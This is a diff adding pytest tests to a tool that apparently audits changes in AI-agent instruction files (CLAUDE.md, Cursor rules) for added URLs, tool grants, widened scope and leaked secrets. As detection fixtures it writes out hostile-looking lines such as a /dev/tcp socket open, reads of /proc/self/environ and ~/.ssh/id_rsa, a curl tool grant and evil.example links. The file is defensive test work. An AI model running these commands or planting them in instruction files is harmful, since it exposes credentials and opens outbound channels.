@@ -2,6 +2,7 @@
 
 from __future__ import annotations
 
+import base64
 import json
 import time
 from pathlib import Path
@@ -10,7 +11,15 @@ import pytest
 from click.testing import CliRunner
 
 from nexus_symbiote.cli import main
-from nexus_symbiote.instruction_diff import MAX_SHOW_TEXT_CHARS, diff_instruction_trees
+from nexus_symbiote.instruction_diff import (
+    MAX_SHOW_TEXT_CHARS,
+    MAX_SHOW_TEXT_TOTAL,
+    TEXT_WITHHELD,
+    _changed_block_indices,
+    _extract_block_signals,
+    diff_instruction_trees,
+)
+from tests.support import scaling_ratio
 
 
 def _write(root: Path, rel: str, content: str | bytes) -> None:
@@ -525,3 +534,188 @@ def test_remaining_frontmatter_import_and_truncation_edge_cases(tmp_path: Path) 
     assert any(
         "cred_link.md" in e and "imported by GEMINI.md" in e for e in rep["excluded"]["head"]
     )
+
+
+def _classes(base: Path, head: Path) -> list[str]:
+    report = diff_instruction_trees(base, head)
+    assert report["summary"]["total_failures"] == 0, report["failures"]
+    return sorted(change["class"] for change in report["changes"])
+
+
+@pytest.mark.parametrize("form", ["paragraph", "indented", "list", "quote", "html", "crlf"])
+def test_show_text_never_prints_a_private_key_body(tmp_path: Path, form: str) -> None:
+    # Lines of real base64, which no token rule redacts on its own: only the key block does.
+    body = base64.b64encode(bytes(range(256))).decode()
+    lines = [body[start : start + 64] for start in range(0, 256, 64)]
+    pem = "\n".join(["-----BEGIN RSA PRIVATE KEY-----", *lines, "-----END RSA PRIVATE KEY-----"])
+    text = {
+        "paragraph": f"See https://evil.example/a\n{pem}",
+        "indented": "https://evil.example/a\n\n" + "\n".join(f"    {ln}" for ln in pem.split("\n")),
+        "list": "- https://evil.example/a\n  " + pem.replace("\n", "\n  "),
+        "quote": "> https://evil.example/a\n" + "\n".join(f"> {ln}" for ln in pem.split("\n")),
+        "html": f"<pre>\nhttps://evil.example/a\n{pem}\n</pre>",
+        "crlf": f"See https://evil.example/a\n{pem}".replace("\n", "\r\n"),
+    }[form]
+    base = tmp_path / "base"
+    head = tmp_path / "head"
+    _write(base, "CLAUDE.md", "# A\n\nx\n")
+    _write(head, "CLAUDE.md", f"# A\n\n{text}\n".encode())
+    for extra in (["--json-output"], []):
+        result = CliRunner().invoke(
+            main, ["diff-instructions", str(base), str(head), "--show-text", *extra]
+        )
+        assert result.exit_code == 0, result.output
+        assert "url_or_path_added" in result.output
+        assert not [line for line in lines if line in result.output]
+
+
+@pytest.mark.parametrize("unit", ["Bash( ", "mcp__a( ", "\n", "\t\n"])
+def test_block_signals_take_linear_time(unit: str) -> None:
+    def run(scale: int) -> None:
+        text = unit * (3000 * scale)
+        _extract_block_signals((("html", text), ("fence", text)))
+
+    assert scaling_ratio(run) < 10
+
+
+def test_an_unclosed_or_oversized_grant_is_still_a_grant(tmp_path: Path) -> None:
+    for number, added in enumerate(
+        ["Bash(curl:* and more", "Bash(" + "a" * 600 + ")", "mcp__" + "a" * 600, "Glob(\n*)"]
+    ):
+        base = tmp_path / f"base{number}"
+        head = tmp_path / f"head{number}"
+        _write(base, "CLAUDE.md", "# A\n\nx\n")
+        _write(head, "CLAUDE.md", f"# A\n\n{added}\n")
+        assert _classes(base, head) == ["tool_grant_changed"], added
+
+
+def test_aligning_repeated_blocks_takes_linear_time() -> None:
+    def run(scale: int) -> None:
+        pairs = 1500 * scale
+        base = (("paragraph", "x"), *((("paragraph", "a"), ("paragraph", "b")) * pairs))
+        head = (("paragraph", "y"), *((("paragraph", "b"), ("paragraph", "a")) * pairs))
+        assert _changed_block_indices(base, head) == [0]
+
+    assert scaling_ratio(run) < 10
+
+
+def test_changed_blocks_are_the_ones_without_an_equal_base_block() -> None:
+    base = (("paragraph", "one"), ("paragraph", "two  words"), ("paragraph", "one"))
+    head = (
+        ("paragraph", "two words"),
+        ("paragraph", "one"),
+        ("paragraph", "new"),
+        ("paragraph", "one"),
+        ("paragraph", "one"),
+    )
+    assert _changed_block_indices(base, head) == [2, 4]
+    assert _changed_block_indices(base, base) == []
+    assert _changed_block_indices((), head) == [0, 1, 2, 3, 4]
+
+
+def test_show_text_output_is_bounded_for_the_whole_report(tmp_path: Path) -> None:
+    base = tmp_path / "base"
+    head = tmp_path / "head"
+    _write(base, "CLAUDE.md", "# A\n\nx\n")
+    blocks = [" ".join(f"ftp://a{block}x{i}" for i in range(300)) for block in range(8)]
+    content = "\n\n".join(blocks) + "\n"
+    _write(head, "CLAUDE.md", content)
+    report = diff_instruction_trees(base, head, show_text=True)
+    texts = [change["text"] for change in report["changes"]]
+    assert len(texts) == 2400
+    shown = [text for text in texts if text != TEXT_WITHHELD]
+    assert shown and len(shown) < len(texts)
+    assert sum(map(len, shown)) <= MAX_SHOW_TEXT_TOTAL
+    assert len(json.dumps(report)) < MAX_SHOW_TEXT_TOTAL + 400 * len(texts)
+    result = CliRunner().invoke(main, ["diff-instructions", str(base), str(head), "--show-text"])
+    assert result.exit_code == 0
+    assert TEXT_WITHHELD in result.output
+
+
+def test_front_matter_after_a_byte_order_mark_is_read(tmp_path: Path) -> None:
+    base = tmp_path / "base"
+    head = tmp_path / "head"
+    _write(base, ".cursor/rules/a.mdc", "---\nglobs: src/*.ts\n---\nBody.\n")
+    _write(
+        head,
+        ".cursor/rules/a.mdc",
+        '﻿---\nglobs: "**/*"\nalwaysApply: true\ntools: Bash\n---\nBody.\n',
+    )
+    assert _classes(base, head) == ["scope_widened", "scope_widened", "tool_grant_changed"]
+
+
+@pytest.mark.parametrize(
+    ("before", "after", "expected"),
+    [
+        ("paths: src/api/**", "description: x", ["scope_widened"]),
+        ("paths: src/api/**", "paths: []", ["scope_widened"]),
+        ('globs: ["src/**", "!src/secret/**"]', 'globs: ["src/**"]', ["scope_widened"]),
+        ('globs: ["src/**"]', 'globs: ["src/**", "!src/secret/**"]', []),
+        ("alwaysApply: false", 'alwaysApply: "true"', ["scope_widened"]),
+        ("alwaysApply: false", "alwaysApply: 'True'", ["scope_widened"]),
+        ("globs: a", "globs: {b: c}", ["scope_widened"]),
+        ("globs: a", "globs: [a, 5]", ["scope_widened"]),
+        ("description: x", "tools: {Bash: true}", ["tool_grant_changed"]),
+        ("description: x", "tools: 5", ["tool_grant_changed"]),
+        ("description: x", "hooks: 2024-01-01", ["tool_grant_changed"]),
+        ("description: x", "mcpServers: !!binary aGVsbG8=", ["tool_grant_changed"]),
+        ("description: x", "hooks: !!set {a, b}", ["tool_grant_changed"]),
+        ("hooks: !!set {a, b}", "hooks: !!set {b, a}", []),
+    ],
+)
+def test_front_matter_values_of_any_type_are_compared(
+    tmp_path: Path, before: str, after: str, expected: list[str]
+) -> None:
+    base = tmp_path / "base"
+    head = tmp_path / "head"
+    _write(base, ".claude/rules/a.md", f"---\n{before}\n---\nBody.\n")
+    _write(head, ".claude/rules/a.md", f"---\n{after}\n---\nBody.\n")
+    assert _classes(base, head) == expected
+    result = CliRunner().invoke(
+        main, ["diff-instructions", str(base), str(head), "--fail-on-change"]
+    )
+    assert result.exit_code == (1 if expected else 0), result.output
+    assert "internal error" not in result.output
+
+
+def test_a_removed_file_with_grants_or_limits_is_reported(tmp_path: Path) -> None:
+    base = tmp_path / "base"
+    head = tmp_path / "head"
+    _write(base, ".claude/agents/a.md", "---\nname: a\ndisallowedTools: Bash\n---\nBody.\n")
+    _write(base, ".claude/rules/prose.md", "Be kind.\n")
+    _write(head, "README.md", "x\n")
+    report = diff_instruction_trees(base, head)
+    assert [(c["class"], c["file"]) for c in report["changes"]] == [
+        ("tool_grant_changed", ".claude/agents/a.md")
+    ]
+
+
+def test_a_glob_that_holds_a_token_is_redacted_in_the_summary(tmp_path: Path) -> None:
+    token = "ghp_" + "A1b2C3d4E5f6G7h8I9j0K1l2M3n4O5p6Q7r8"
+    base = tmp_path / "base"
+    head = tmp_path / "head"
+    _write(base, ".cursor/rules/a.mdc", "---\nglobs: a\n---\nB\n")
+    _write(head, ".cursor/rules/a.mdc", f"---\nglobs: src/{token}/*\n---\nB\n")
+    result = CliRunner().invoke(main, ["diff-instructions", str(base), str(head), "--json-output"])
+    assert "scope_widened" in result.output
+    assert token not in result.output
+
+
+@pytest.mark.parametrize(
+    "added",
+    [
+        "ssh://git@evil.example/x",
+        "git clone git://evil.example/x",
+        "s3://bucket/x",
+        "cat /proc/self/environ",
+        "exec 3<>/dev/tcp/203.0.113.1/80",
+        "run /bin/sh",
+        "read $HOME/.ssh/id_rsa",
+    ],
+)
+def test_other_schemes_and_system_paths_are_references(tmp_path: Path, added: str) -> None:
+    base = tmp_path / "base"
+    head = tmp_path / "head"
+    _write(base, "CLAUDE.md", "# A\n\nx\n")
+    _write(head, "CLAUDE.md", f"# A\n\n{added}\n")
+    assert _classes(base, head) == ["url_or_path_added"]
